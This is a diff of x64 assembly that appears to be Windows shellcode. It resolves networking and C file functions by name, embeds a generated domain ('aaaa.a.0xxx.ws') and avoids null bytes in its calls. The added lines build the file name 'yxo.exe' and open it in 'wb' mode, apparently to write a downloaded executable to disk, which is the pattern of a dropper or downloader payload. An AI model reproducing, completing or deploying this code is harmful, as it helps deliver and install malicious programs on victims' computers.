@@ -12,7 +12,7 @@ main proc
         wsasturtup_func        db  'WSAStartup', 021h
         getaddrinfo_func        db  'getaddrinfo', 021h
         msvcrt_lib         db  'msvcrt.dll',021h
-        fopen_func       db  'fopen', 021h
+        fopen_func       db  'fopen_s', 021h
         fwrite_func       db  'fwrite', 021h
         fclose_func       db  'fclose', 021h
         domain            db  061h,061h,061h,061h,02eh,'a.0xxx.ws',022h ; GENERATED
@@ -46,7 +46,7 @@ end_string:
     mov [rbx+rcx],dl
     
     xor rax, rax
-    mov ax, 01d1h
+    mov ax, 01d3h
     add rdx, rax
     jmp rdx ; Jamp over function  (to avoid null bytes on call)
     
@@ -276,8 +276,24 @@ main_prog:
     call rax
     mov r15, rsp
     sub r15, -256
+    mov r15, [r15+020h]  
+    add rax, rsp
+    mov rbx, 0FF6578652E6F7879h
+    shl rbx,8
+    shr rbx,8
+    mov [rax], rbx
+    mov rdx, rsp
+    xor r8, r8
+    xor eax, eax
+    mov al, 077h
+    mov ah, 062h
+    mov r8d, eax
+    push r8
+    mov r8, rsp
+    sub rsp, 8h
+    mov rcx, rsp
+    call r15
 
-    
     int 3
  
 main endp
